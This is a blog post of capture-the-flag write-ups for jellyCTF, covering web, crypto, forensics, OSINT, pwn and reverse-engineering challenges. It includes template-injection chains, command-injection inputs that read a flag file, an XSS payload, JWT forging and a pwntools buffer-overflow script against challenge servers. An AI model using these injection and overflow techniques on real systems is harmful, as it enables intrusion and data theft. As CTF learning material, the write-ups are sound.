---
author: atch2203
pubDatetime: 2024-06-24
title: jellyCTF
featured: false
draft: false
tags:
  - other
  - writeups
description: jellyCTF writeups
---
Sometime during the middle of last week I decided to actually start playing CTFs, and I remember dungwinix mentioned that jellyc.tf was going on for 2 weeks and that it was good for beginners (aka me). 

> go check his writeups at https://dungwinux.github.io/-blog/security/2024/06/24/jellyctf.html, he was the first solo team to full clear w/o hints (i think)

I used a lot of hints (almost all of them), but I was able to solve 10/10 web, 6/8 osint, 3/3 pwn, 8/10 crypto, 6/7 forensics, 5/5 misc, 3/3 rev. Personally, I thought that the pwn and rev were lacking, but I learned a good amount in the other catagories.
![my "awards"](@assets/images/writeups/jellyctf/awardssmall.png)
<div align="center" style="color:#888888"><em>My "awards"</em></div>

<div id="toc" />
TOC:
- <a href="#web">web</a>
- <a href="#forensics">forensics</a>
- <a href="#crypto">crypto</a>
- <a href="#misc">misc</a>
- <a href="#osint">osint</a>
- <a href="#pwn">pwn</a>
- <a href="#rev">rev</a>
# web
<a href="#toc">back to TOC</a>
<div id="web" />
##### do_not_trust
Opening robots.txt gives us
```
User-agent: *
Disallow: /
# jellyCTF{g0d_d4mn_cL4nk3r5}
```

### vlookup_hot_singles
For the first stage, our goal is to impersonate the user "jelly" by modifying the JWT token. In the files provided, we are given the secret `singaQu5aeWoh1vuoJuD]ooJ9aeh2soh`, so we just copy the token into a [jwt.io](jwt.io) and modify the "user" field to "jelly". Sending a request to the /admin page with the new token gives us the flag, and access to part 2.
![alt text](https://github.com/atch2203/jellyctf/blob/main/web/vlookup_hot_singles/part1req.png?raw=true)

flag: `jellyCTF{i_am_b3c0m3_awawa_d3str0y3r_0f_f3m4135}`

##### vlookup_hot_singles_2
In the admin panel, there is a space to upload a spreadsheet and have the server send it back with columns added. I remembered a trick stolenfootball ([shoutout](https://stolenfootball.github.io/)) where you can unzip microsoft docx/xlsx files, so I made a blank spreadsheet and did that. The resulting files are xml, meaning that it's probably some xxe attack. Using a hint shows that the payload has to be in `docProps/core.xml`, and putting the xxe in there gives us the flag.

flag: `jellyCTF{th1s_1snt_a_r3d_0n3_r1gh7?}`

##### factory_clicker
The files provided show that there is an `/increment` endpoint for post requests, so just send a post request with a large number.
![alt text](https://github.com/atch2203/jellyctf/blob/main/web/factory_clicker/factoryoverload.png?raw=true)

flag: `flag jellyCTF{keep_on_piping_jelly}`

##### bro_visited_his_site_2
You can do SSTI with the `word` parameter, and our goal is to get to `FileIO`, which can be done with this chain: `dict.__base__.__subclasses__()[114].__subclasses__()[1].__subclasses__()[0]('/app/flag.txt').read()`

flag: `jellyCTF{rc3p1lled_t3mpl4te_1nj3ct10nmaxx3r}`

##### bro_visited_his_site
For some reason, this one was harder than its sequel, and using the [hint](https://ctftime.org/writeup/10895) basically gave the solution: `url_for.__globals__['current_app'].config['FLAG']`

flag: `jellyCTF{f1agp1ll3d_t3mpl4te_1nj3ct10nmaxx3r}`

check out [dungwinix](https://dungwinux.github.io/-blog/security/2024/06/24/jellyctf.html) for an unintended+easier solution

##### aidoru
The goal here is to get to find the secret uuid of `"jelly"`. Looking at the other uuids, they look like a hash, and putting them in a hash cracker shows that it's md5. The md5 of jelly is `328356824c8487cf314aa350d11ae145`, and going to [https://aidoru.jellyc.tf/static/secret_data/328356824c8487cf314aa350d11ae145.json](https://aidoru.jellyc.tf/static/secret_data/328356824c8487cf314aa350d11ae145.json) gives the flag.

flag: `jellyCTF{u_r_the_p3rfect_ultimate_IDOR}`

##### awafy_me
This is a simple code injection; just put `a; ls` and then `a; cat flag.txt`

flag: `jellyCTF{c3rt1fied_aw4t15tic}`

##### awascii_validator
Our goal is to get our payload to `debug()`, but it is translated from awascii before it is sent to debug. Translating `;ls` results in `awawawawawawa awa awawa awa awa awa awa awawa awawa awa awa`, and sending it in shows that the flag is in `./flag`. To translate `;cat flag`, I used the python code form awafy_me (which for some reason prints backwards)
![alt text](https://github.com/atch2203/jellyctf/blob/main/web/awascii_validator/Screenshot%202024-06-18%20215128.png?raw=true)
flag: `jellyCTF{m4st3rs_1n_awat1sm}`
##### pentest_on_stream
A simple xss is easy to do, but to access the obs json file is more difficult. Using the hint led to the obs documentation, which shows that `window.obsstudio.getScenes` is what we want.
Inputting 
```html
<script>
window.obsstudio.getScenes(function (scenes) {
    document.getElementById("name").innerHTML=scenes[1];
});
</script>
```

gives the flag: `jellyCTF{y0u_CANT_ju5t_d0_that_dud3}`

# forensics
<a href="#toc">back to TOC</a>
<div id="forensics" />
##### alien_transmission
Popping the mp3 into a spectrum analyzer shows the flag:
![alt text](https://github.com/atch2203/jellyctf/blob/main/forensics/alientransmission/jelly.png?raw=true)

flag: `jellyCTF{youre_hearing_things}`

##### mpreg
Popping the file into a hex editor shows that it should be an mp4 file, so changing the `2avc1mpreg4` to `2avc1mp4` fixes the video.

flag: `jellyCTF{i_can_fix_her}`

##### the_REAL_truth
The image definitely has data encoded in it, but I wasn't able to figure it out without a hint. Filtering the red channel (since there's a cyan bar at the top) gives the flag in the data + some excerpt from [jelly's wiki](https://virtualyoutuber.fandom.com/wiki/Jelly_Hoshiumi). 

flag: `jellyCTF{th3_w0man_in_th3_r3d_ch4nn3l}`

Fun fact the text in the caard.co is also taken from the Profile section of her wiki

##### the_REAL_truth_2
Fun fact: I stumbled across `image_02` somehow without looking at `sitemap.xml`
XORing the images gives the flag
![flag](https://github.com/atch2203/jellyctf/blob/main/forensics/the_real_truth/Screenshot_20240619_024223.png?raw=true)

flag: `jellyCTF{tw0_h41v3s_m4k3_a_wh0L3}`

##### head_empty
I used the hint to figure out to use volatility3, and after watching a [guide](https://dfir.science/2022/02/Introduction-to-Memory-Forensics-with-Volatility-3), you just dump the password hashes and crack it with hashcat to get `jellynerd2`

flag: `jellyCTF{jellynerd2}`

##### head_empty_2
This one probably took me the longest(out of the ones I solved), with many dead ends.
I attempted to dump the files of the mspaint process and binwalk it, showing that there were a lot of png images. Unfortunately, they were just the microsoft app icons.

I also attempted to binwalk the entire memory dump, which did give false hope
`206700544     0xC520000       PC bitmap, Windows 3.x format,, 129 x 115 x 24`
but the bitmap was garbage data.

Using the hint showed that you needed to dump the memory of the process,  so I did
`p vol.py -f ../memory.dmp windows.memmap --dump --pid 4700 > ../memdump.txt`

Eventually, I stumbled across a post of [literally the same challenge](https://github.com/h4x0r/ctf-writeups/blob/master/Google-CTF-2016/For1/README.md) which just recommended to put the memory dump in gimp and scroll through it until you found "a contigeous block of non-random data". 
Doing so with width=1000 and height=6000, showed that there was indeed such a block in the memory, although upside down. Tuning to width=300 (the same dimensions as the [twitter post](https://x.com/jellyhoshiumi/status/1785919609872474201)) gave the complete image.
![alt text](https://github.com/atch2203/jellyctf/blob/main/forensics/headempty/evenbetterflip.png?raw=true)

flag: `jellyCTF{pa1nt_pr1nc355}`

# crypto
<a href="#toc">back to TOC</a>
<div id="crypto" />
##### cult_classic_1
This was just a series of mini-crypto puzzles:
1) The first letter of each line reads `PRINCESS`
2) b64->rot-3 gives `If you can decode this, you can have the next key: BIGNERD`
3) Vig decode `KMRYCTWG{` with it's corresponding `JELLYCTF{` gives `BIGNERD` as the key. Decoding the whole thing gives `NOT BAD, HERES A FLAG FOR YOUR EFFORTS SO FAR: JELLYCTF{THIS_IS_JUST_A_WARM_UP} HOWEVER YOUR JOURNEY IS NOT OVER, TAKE THIS KEY AND PROCEED FORWARD: ALIEN`

flag: `JELLYCTF{THIS_IS_JUST_A_WARM_UP}`
##### cult_classic_2
4) [brute forcing] a playfair cipher gives `ALIEN->ACOUSTIC` as one of the possibilities
5) Using a hint shows that you need to look at [luminary's lyrics](https://www.youtube.com/watch?v=1x6oPy3Hwcw), and each `#.#` corresponds to line.col. Decoding gives "Capitalize megalencephaly for the next ..."
6) Decoding a bacon cipher (with complete alphabet) gives `THEFINALPASSWORDISSADGIRL`

flag: `jellyctf{jelly_was_probably_older_than_these_ciphers}`

##### cipher_check
each clue corresponds to something in the form of `ANSWER____`, and filling in the board gives `follow moist duel xqc in detail on special lineup event he won mate in 6 moves!` Following the moves of the [game](https://www.youtube.com/watch?v=e91M0XLX7Jw) and putting the corresponding letters of the squares in order gives `istillloveit`.

flag: `jellyCTF{istillloveit}`

##### exclusively_yours
XORing the hex with `jellyCTF` shows that the flag is XORed with itself shifted 3 bytes to the left. A script can reverse that:
```python
c = "06 1C 2F 38 3F 38 2C 29 09 0A 16 2D 1C 16 2B 31 17 1B 2D 0A 16 0F 18 1C 11"
c = c.split()
c = [int(i, 16) for i in c]
res = ""
key = "jel"
for i in range(len(c)):
    k = key[-3]
    next = c[i]^ord(k)
    key += chr(next)
    res += k
print(res)
```

flag: `jellyCTF{xorry_not_xorry}`

##### dizzy_fisherman
Here we are able to input the base for two people's AES encryption key. If you input 2 (or any number for that matter) you can easily brute force the exponent and get the key.
```python
from Crypto.Util import number
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

def brute_force(base, res, mod):
    b = base
    for i in range(2, 10000+1):
        b = (b*base)%mod
        if b == res: return i

p = 63579193433447636138142180956143903452427972074605894864703396671022456098599
g = 2
pa = 12216650520779549051085807383600007441099464649139735571057936351615978497631
pb = 268435456 # thats crazy

cip = "7c78e0ee6710a27b97cfb37501e02cc0e4f8cf921ecb9a891793622361efaa6cc7618b790239761506f8f83fa49b974ac7618b790239761506f8f83fa49b974a"

sa = brute_force(g, pa, p)
sb = brute_force(g, pb, p)
key = pow(pa, sb, p)

encoded_key = key.to_bytes(32, byteorder='big')
cipher = AES.new(encoded_key, AES.MODE_ECB)

pt = cipher.decrypt(bytes.fromhex(cip))
print(pt)
```

flag: `jellyCTF{SOS_stuck_in_warehouse}`

##### really_special_awawawas
Using the [hint](https://crypto.stackexchange.com/questions/74891/decrypting-multi-prime-rsa-with-e-n-and-factors-of-n-given) showed that the RSA encryption used more than 2 primes.
I first read up a bit on how to break RSA:
- [stackoverflow](https://stackoverflow.com/questions/58750417/how-to-decrypt-an-rsa-encryption)
- [wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem)#Decryption)

```python
n = 40095322948381328531315369020145890848992927830000776301309425505
e = 65537
cip = 35622053067320123838840878683947610930876835359945867019927573838

from sympy.ntheory import factorint
factors = factorint(n)
print(factors)
# {5: 1, 23: 1, 460465412038271581: 1, 757179525420813109550252454787205779901919127: 1}

factors = [(5,1), (23,1), (460465412038271581,1), (757179525420813109550252454787205779901919127,1)]
d = inverse(e, carmichael_lambda(factors))
print(d)
# 287458461584463336135331697997301511216944981741119712297623893

m = pow(cip,d,n)
h = hex(m)
print(h)
print(bytes.fromhex(h[2:]).decode())
```

flag: `jellyCTF{awawas_4_every1}`

##### the_brewing_secrets
The `rand()` function is seeded with the current time in seconds, so we can easily copy and use the number to build the passcode.
```python
passcodeLength = 6
bitmask = (1 << passcodeLength) - 1

libc = CDLL("libc.so.6")

# p = process("./a.out", stdin=PTY, stdout=PTY)
p = remote(host='chals.jellyc.tf', port=6000)

s = int(time.time())
# print(s)

libc.srand(s)
for i in range(10):
  r = libc.rand()
  # print(f"r{i} {r}")
  passcode = r & bitmask
  print(f"passcode{i} {bin(passcode)}")
  print(p.recvuntil(b"passcode"))
  p.sendline(bin(passcode)[2:].encode('utf-8'))

print(p.recvuntil(b"}"))

p.interactive()
```

flag: `jellyCTF{mad3_w1th_99_percent_l0v3_and_1_percent_sad_g1rl_t3ars}`

##### cherry
The goal here is to get three cherries, which corresponds to solving a linear system
```
19*a + 32*b + 347*c = -10992 (mod m)
22*a + 27*b + 349*c = -30978 (mod m)
19*a + 29*b + 353*c = -12520 (mod m)
```
Solving the system with sagemath gives the amount of spins we need to do for each mode for various modulo offsets:
```
sage: solve_mod([19*a + 32*b + 347*c == -30983,22*a + 27*b + 349*c == -7390,19*a + 29*b + 353*c == -481],m)
[(10469, 7226, 14158)]
sage: solve_mod([19*a + 32*b + 347*c == -10992,22*a + 27*b + 349*c == -30978,19*a + 29*b + 353*c == -12520],m)
[(4194, 29860, 25598)]
sage: solve_mod([19*a + 32*b + 347*c == -25974,22*a + 27*b + 349*c == -26744,19*a + 29*b + 353*c == -9122],m)
[(20582, 3380, 26344)]
```
At this point it look like spinning that many times will get the awascii32 lines to show the flag, and we can do that by modifying the code:
```js
function playCoin(n){
  spinMode = n;
  if (n == 0)       spinCounts = [10469, 7226, 14158];//slotSpins = [ 19,  22,  19];    you_won_c
  else if (n == 1)    spinCounts = [4194, 29860, 25598];//slotSpins = [ 32,  27,  29];   jellyCTF{
  else if (n == 2)    spinCounts = [20582, 3380, 26344];//slotSpins = [347, 349, 353];   herries!}
  updatePlaintextDisplay();
  updateModeDisplay();
}
```
![flag](https://github.com/atch2203/jellyctf/blob/main/crypto/cherry_dist/WWWWW.png?raw=true)

flag: `jellyCTF{you_won_cherries!}`

# misc
<div id="misc" />
<a href="#toc">back to TOC</a>
##### welcome
This was the hardest challenge ever

flag: `jellyCTF{L1k3_th15}`

##### watch_streams
Going to the description of [jelly's ctf stream](https://www.youtube.com/watch?v=QH8LKkIVHzI) gives the flag

flag: `jellyCTF{jerrywashere123}`

##### this_is_canon
Looks like huffman encoding, but I only have a vague idea of how it exactly works.
It took me a while to figure out what each character corresponded to in binary.
```python
out = "1000001010010011101111101011101011111010000010100100110000111001110111010000111011100111110100111100100110101111000001110010110110010001100011011001000011001110011101000110101100010110011111111"
flag = ""

class Node:
    # z is 0, o is 1
    def __init__(self, c=None):
        self.c = c
        self.z = None
        self.o = None


trees = {
    '_':"000",
    'e':"001",
    'l':"010",
    'y':'011',
    'j':'1000',
    'o':'1001',
    'r':'1010',
    'a':'10110',
    'c':'10111',
    'd':'11000',
    's':'11001',
    't':'11010',
    'u':'11011',
    'w':'11100',
    'f':'111010',
    'h':'111011',
    'k':'111100',
    'm':'111101',
    '{':'111110',
    '}':'111111'
}

root = Node()
for ch in trees:
    v = trees[ch]
    h = root
    for p in v:
        if p == '1':
            if h.o:
                h = h.o
            else:
                h.o = Node()
                h = h.o
        else:
            if h.z:
                h = h.z
            else:
                h.z = Node()
                h = h.z
    h.c = ch

it = root
for b in out:
    if it.c:
        flag += it.c
        it = root
    if b == '1':
        it = it.o
    else:
        it = it.z

print(flag)
```

flag: `jellyctf{jelly_your_homework_was_due_yesterday}`

##### is_jelly_stuck
Solving the crossword shows that you have to go to [Baba is you](https://hempuli.itch.io/baba-is-you-level-editor-beta) with the level code `jieu-dkxx`
I forgot to take a screenshot of the level, but you have to get the cat to sleep again with the "cat is sleep" thing facing horizontally, and from there you can push it down and be in the same block as "is".
The flag is made by matching the letters of the crossword with your movements (like cipher_check)

flag: `jellyCTF{krodflakarkt_k__aliases_c_led_ls}`

##### just_win_lol
The real challenge in this one for me was getting the docker container working. I had to modify code from [the templ docs](https://templ.guide/quick-start/installation#docker) to get it to work.
```dockerfile
# Fetch
FROM golang:latest AS fetch-stage
COPY go.mod go.sum /app/
WORKDIR /app
RUN go mod download

# Generate
FROM ghcr.io/a-h/templ:latest AS generate-stage
COPY --chown=65532:65532 . /app
WORKDIR /app
RUN ["templ", "generate"]

# Build
FROM golang:latest AS build-stage
COPY --from=generate-stage /app /app
WORKDIR /app
RUN CGO_ENABLED=0 GOOS=linux go build -o /just-win-lol

FROM alpine:latest AS run
WORKDIR /app
RUN adduser -S jelly
USER jelly
COPY --chown=jelly assets /app/assets
COPY --from=build-stage --chown=jelly /just-win-lol /app/
EXPOSE 8080
ENTRYPOINT ["/app/just-win-lol"]
```
After that I just patched main.go to print to console every time it won.
```go
ever:= 1
	for ever < 2 {
		log.Println("slept 0.5 second")
		time.Sleep(time.Second/2)
		// current time in unix seconds
		var timeNow = time.Now().UTC().Unix()
		var rand_time = rand.New(rand.NewSource(timeNow))
		hand := randHand(*rand_time)
		if isFiveOfAKind(hand) {
			log.Println("win=--=-=-=-=-=-=-=-=-=-=-=-=-=")
		}

	}
```
After that it was just a test of reaction speed for 5 minutes.
![script](https://github.com/atch2203/jellyctf/blob/main/misc/just_win_lol/script.png?raw=true)

flag: `jellyCTF{its_v3ry_stra1ghtf0rw4rd_s1mply_g3t_g00d_rng}`

# osint
<a href="#toc">back to TOC</a>
<div id="osint" />
##### stalknights_1
reverse image searching the post gives us [zaanse-schans](https://www.travelwithsimina.com/one-day-in-zaanse-schans/)

flag: `jellyCTF{zaanse_schans,netherlands}`

##### stalknights_3
They tweeted "last friday" on may 9, so the flight was on may 3rd.
Plugging in the plane code `JA784A` into [flightera.net](https://www.flightera.net/en/planes/JA784A) shows that there was 1 flight on [may 3rd](https://www.flightera.net/en/flight_details/All+Nippon+Airways/NH160/RJTT/2024-05-03), arriving in JFK airport.

flag: `jellyCTF{new_york,united_states_of_america}`

##### stalknights_4
You can find the github at [https://github.com/starknight1337](https://github.com/starknight1337), with a rustlings_practice repo. Their twitter says they force pushed to hide their name, but you can find the logs of the repo in github's api. Run `curl https://api.github.com/repos/starknight1337/rustlings_practice/events` to get `Luke Ritterman` as the name.

flag: `jellyCTF{luke_ritterman}`

##### secret_engineering_roleplay
If you use [a tool to see hidden channels](https://github.com/Tyrrrz/DiscordChatExporter/releases/tag/2.43.3), you can find the flag in the hidden channel's names.

flag: `jellyCTF{that-is-what-the-e-stands-for-right}`

##### into_the_atmosphere
I originally thought they were talking about a youtube channel, but after some time, I realized that [the link](https://cdn.discordapp.com/attachments/225994578258427904/1249437169056088176/Punting_Jelly.mov?ex=6678700a&is=66771e8a&hm=e5e9b77b22caf6450c5fc2dd22b273f15802f5531a9bd8a1334553c643c90827&) has `225994578258427904` and `1249437169056088176` as "timestamps", so throwing those into [a snowflake converter](https://snowsta.mp/?l=en-us&z=dz&f=c2ku4tniez-1gw) gives `2016-09-15T15:01:46.233Z`.

flag: `2016-09-15T15:01:46.233Z`

##### super_fan
I had to use a hint for this: you need to find the twitter id of the user, which can be done through their banner on [wayback machine](https://web.archive.org/web/20240325165547/https://twitter.com/j3llyfan7)
The id for the user is `1772301250572263429`, and according to [this site](https://twirpz.wordpress.com/2015/06/16/how-to-find-twitter-users-previous-usernames/), you can go to [https://x.com/intent/user?user_id=1772301250572263429](https://x.com/intent/user?user_id=1772301250572263429) to find the new account.
The three posts
```
dGhpc193YXNfbm90X215X2ludGVudGlvbn0=
eUNURns=
amVsbA==
```
b64 decode to the flag.

flag: `jellyCTF{this_was_not_my_intention}`

# pwn
<a href="#toc">back to TOC</a>
<div id="pwn" />
##### phase_coffee_1
For all of these, the goal is to get enough money to buy [jelly's coffee](https://shop.phase-connect.com/collections/coffee/products/custom-roast-coffee-beans-hoshiumi-jelly)
You can do an integer overflow to subtract negative money
![rip opsec](https://github.com/atch2203/jellyctf/blob/main/pwn/phase_coffee_1/cashmoney.png?raw=true)

flag: `jellyCTF{sakana_your_C04433_shop_broke}`

##### phase_coffee_2
The idea here is similar, except you can't put negative numbers as input. However, the program multiples your input by 35 to decide how much money to subtract, so you can still do an integer overflow with `61356699*35`.

flag: `jellyCTF{dud3_y0u_m1ss3d_4n0th3r_bug}`

##### phase_coffee_3
This time you actually need to do a buffer overflow. 
Using cyclic we find that `remaining_coin_balance` is an offset of 160 from the buffer. 
![offset](https://github.com/atch2203/jellyctf/blob/main/pwn/phase_coffee_3/overflowpoc.png?raw=true)
```python
from pwn import *

io = remote(host="chals.jellyc.tf", port=5002)

io.sendline(b'2')
io.sendline(b'1')
io.sendline(b'1')
io.sendline(cyclic(160)+p64(0x7fffffff))

io.interactive()
```

flag: `jellyCTF{ph4se_c0nn3ct_15_definitely_a_coff33_comp4ny}`

# rev
<a href="#toc">back to TOC</a>
<div id="rev" />
##### awassmbely
Replace each awa5.0 bit with binary, and then run the assembly by hand to get `11010000`, or 208

flag: `jellyCTF{208}`

##### lost_in_translation
The script converts the flag to awascii, but it uses 8 bits instead of 6 bits. We just translate from awascii, using 8 bits per char.
```python
lookup = "AWawJELYHOSIUMjelyhosiumPCNTpcntBDFGRbdfgr0123456789 .,!'()~_/;\n"
out = " awa awa awa awawawawa awa awa awa awa awawawawawa awa awa awawa awa awa awa awa awa awa awawa awa awa awa awa awa awa awawa awa awa awawa awa awa awawawa awa awawa awa awa awawawa awawawa awa awawa awa awa awawa awa awa awawawawa awa awawa awa awa awawawa awa awawa awa awawa awawa awawa awa awa awa awawawawa awa awa awa awawa awawa awawawa awa awawa awawawa awawa awa awawa awa awa awa awawa awa awawawawawa awa awa awa awa awawawawawawa awa awa awa awa awa awawawa awa awawa awawa awawa awa awa awawawawawa awa awa awa awawa awa awawa awawa awa awawa awawa awawawa awa awa awawawa awawawa awa awawawawawa awa awa awa awa awawawawawawa awa awawa awawa awawa awa awa awawa awawa awawa awa awa awawawawawa awa awa awa awa awa awawawa awawa awa awa awawa awawawa awa awa awa awawawa awa awawa awa awa awawa awa awawa awa awa awawawawa awawa awa"
binary_awascii = out.replace(" awa", "0").replace("wa", "1")
length = int(len(binary_awascii)/8);
print(length)
flag = ""
for i in range(length):
    c = binary_awascii[8*i:8*i+8]
    ind = int(c, 2)
    flag += lookup[ind]
print(flag)
```

flag: `jellyCTF(C0p13D_tw0_b1T_t00_MuCh)`

##### rev1
Popping the binary into ghidra shows that the flag is `c^eer<M?tZX<*Ia,kX?*MX_)kX:Xik*g<,..v` rot 7.
![ghidra](https://github.com/atch2203/jellyctf/blob/main/rev/rev1chall/ghidra.png?raw=true)
We do the same thing to get the flag.
```python
f = 'c^eer<M?tZX<*Ia,kX?*MX_)kX:Xik*g<,..v'
res = ""
for c in f:
    res += chr(ord(c)+7)
print(res)
# could be 1 line but who cares
```

flag: `jellyCTF{a_C1Ph3r_F1T_f0r_A_pr1nC355}`

# Things I didn't solve
##### osint: stalknights_2
I found the "bright festival" sign and a "28 pizza" restaurant, as well as some tier bikes in the photo. However, I looked at the wrong [bright festival](https://connect.brightfestival.com/past_editions/leipzig-2023/). It happens that [tier bikes](https://www.tier.app/en/where-to-find-us) exist both in leipzig and brussels(which should have been obvious b/c waffles), and I was stuck searching around leipzig to no avail.

You can see the 28 restaurant + the park railing in [google maps](https://www.google.com/maps/@50.8450276,4.356176,3a,87y,32.03h,69.32t/data=!3m7!1e1!3m5!1s6JwJk4AXiLB2oMajwppE7w!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fpanoid%3D6JwJk4AXiLB2oMajwppE7w%26cb_client%3Dmaps_sv.share%26w%3D900%26h%3D600%26yaw%3D32.03466108810561%26pitch%3D20.68420096741795%26thumbfov%3D90!7i16384!8i8192?coh=205410&entry=ttu)

flag: `jellyCTF{square_de_la_putterie}`

##### osint: stalknights_5
Since the twitter user is a programmer (presumably), you can find their [leetcode profile](https://leetcode.com/u/starknight1337/).

flag: `jellyCTF{1337code_0n_str34m}`

##### crypto: you're_based
I decoded the base64 to 
```
That was just a warm up. Here is the actual flag, though you may need a base that's 'A' bit larger:
é©ªê¬ç¡¹ç­ð»æ¨é³æ©©êðµé´é¡æ¥¢æ³é£ð¡ð¡ð¡ð¡ð­ð °
```
However, I wasn't able to crack the gibberish, even when going to [base65535](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode).

It turns out that the text should have been decoded to `驪ꍬ硹答𓉻晨鑳橩ꅟ𓅵鑴鑡楢晳鑣𔕡𔕡𔕡𓁡𓍭𠍰`, which works when put into the base65535 link.

flag: `jellyCTF{th1s_i5_just_a_b4s1c_awawawarmup}`

##### crypto: you're_bababased?
I didn't really attempt this as I didn't solve the prequel, but the solution can be found [here](https://github.com/sa1181405/pbchocolate-ctf/blob/main/jellyctf/crypto/you're_bababased/you're_bababased.md) or on other writeups. Essentially, you have to 
1) convert the characters into their indices in `list_of_safe_unicode_chars.txt`
2) convert that into base `0xbaba`
3) convert that to ascii

flag: `jellyCTF{baba_is_cool_but_j3lly_i5_COOLER}`

##### forensics: oshi_mark
